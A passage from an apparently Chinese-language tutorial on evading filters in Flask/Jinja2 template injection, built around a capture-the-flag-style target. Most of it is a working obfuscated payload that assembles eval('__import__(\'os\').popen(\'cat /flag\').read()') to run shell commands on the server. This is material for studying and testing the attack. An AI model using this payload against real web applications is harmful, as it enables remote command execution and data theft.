</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">left</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">189</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 左括号 (</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">right</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">200</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 右括号 )</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">c</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">reverse</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">first</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 字符 c</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bfh</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">urlencode</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">first</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 百分号 %</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bfhc</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">bfh</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">slas</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">bfhc</span><span style="color:#ff636f">%</span>((<span style="color:#58a1dd">four</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">seven</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># 使用%c构造斜杠 /</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">but</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">buil</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">tins</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># builtins</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">imp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">imp</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ort</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># import</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">pon</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">po</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">pen</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># popen</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">os</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">o</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">s</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># os</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">ca</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ca</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">t</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># cat</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">flg</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">fl</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ag</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># flag</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">ev</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ev</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">al</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># eval</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">red</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">re</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ad</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># read</span>
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bul</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">but</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># __builtins__</span></span></span></code></pre></div><p>所使用的过滤器在上面的表格里有链接。</p>
<p>将上面构造的字符或字符串拼接起来构造出 <code>__import__('os').popen('cat /flag').read()</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">pld</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">imp</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">os</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">point</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">pon</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">ca</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">space</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">slas</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">flg</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">point</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">red</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span> <span style="color:#ff636f">%</span>}</span></span></code></pre></div><p>然后将上面构造的各种变量添加到SSTI万能payload里面就行了：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">f</span>,<span style="color:#58a1dd">v</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">whoami</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">items</span>() <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># globals</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#58a1dd">f</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">bul</span> <span style="color:#ff636f">%</span>} 
</span></span><span style="display:flex;"><span>        {<span style="color:#ff636f">%</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">a</span>,<span style="color:#58a1dd">b</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">v</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">items</span>() <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># builtins</span>
</span></span><span style="display:flex;"><span>            {<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">ev</span> <span style="color:#ff636f">%</span>}    <span style="color:#828b96;font-style:italic"># eval</span>
</span></span><span style="display:flex;"><span>                {{<span style="color:#58a1dd">b</span>(<span style="color:#58a1dd">pld</span>)}}    <span style="color:#828b96;font-style:italic"># eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&#34;)</span>
</span></span><span style="display:flex;"><span>            {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}
</span></span><span style="display:flex;"><span>        {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endfor</span> <span style="color:#ff636f">%</span>}
</span></span><span style="display:flex;"><span>    {<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}
</span></span><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endfor</span> <span style="color:#ff636f">%</span>}</span></span></code></pre></div><p>所以最终的payload为：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">zero</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">38</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">one</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">**</span><span style="color:#58a1dd">zero</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">two</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">four</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">five</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span><span style="color:#ff636f">*</span><span style="color:#58a1dd">two</span>)<span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">seven</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">zero</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">one</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">five</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">abs</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">xhx</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">24</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">space</span> <span style="color:#ff636f">=</span> (({ }<span style="color:#ff636f">|</span><span style="color:#58a1dd">select</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">10</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">point</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">26</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">yin</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">195</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">left</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">189</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">right</span> <span style="color:#ff636f">=</span> ((<span style="color:#58a1dd">app</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__doc__</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">list</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">pop</span>(<span style="color:#a6be9d">200</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">c</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">c</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">reverse</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">first</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bfh</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">self</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">string</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">urlencode</span><span style="color:#ff636f">|</span><span style="color:#58a1dd">first</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bfhc</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">bfh</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">c</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">slas</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">bfhc</span><span style="color:#ff636f">%</span>((<span style="color:#58a1dd">four</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">seven</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">int</span>) <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">but</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">buil</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">tins</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">imp</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">imp</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ort</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">pon</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">po</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">pen</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">os</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">o</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">s</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">ca</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ca</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">t</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">flg</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">fl</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ag</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">ev</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">ev</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">al</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">red</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">dict</span>(<span style="color:#58a1dd">re</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">aa</span>,<span style="color:#58a1dd">ad</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">dd</span>)<span style="color:#ff636f">|</span><span style="color:#58a1dd">join</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">bul</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">but</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">pld</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">imp</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">xhx</span><span style="color:#ff636f">*</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">os</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">point</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">pon</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">ca</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">space</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">slas</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">flg</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">yin</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">point</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">red</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">left</span><span style="color:#ff636f">~</span><span style="color:#58a1dd">right</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">f</span>,<span style="color:#58a1dd">v</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">whoami</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__globals__</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">items</span>() <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#58a1dd">f</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">bul</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">a</span>,<span style="color:#58a1dd">b</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">v</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">items</span>() <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#ff636f">if</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">ev</span> <span style="color:#ff636f">%</span>}{{<span style="color:#58a1dd">b</span>(<span style="color:#58a1dd">pld</span>)}}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endfor</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endif</span> <span style="color:#ff636f">%</span>}{<span style="color:#ff636f">%</span> <span style="color:#58a1dd">endfor</span> <span style="color:#ff636f">%</span>}</span></span></code></pre></div><p>里面的一些索引还需要大家构造一下绕过后的payload自己跑一下，复现的时候不要忘记这一点</p>
<h2 id="过滤了request和class" class="heading-element"><span>过滤了request和class</span>
  <a href="#%e8%bf%87%e6%bb%a4%e4%ba%86request%e5%92%8cclass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这里除了用上面中括号或 <code>|attr()</code> 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。</p>
<p>从Flask官方文档里，找到了session对象，经过测试没有被过滤。更巧的是，session一定是一个dict对象，因此我们可以通过键的方法访问相应的类。<strong>由于键是一个字符串，因此可以通过字符串拼接绕过。</strong></p>
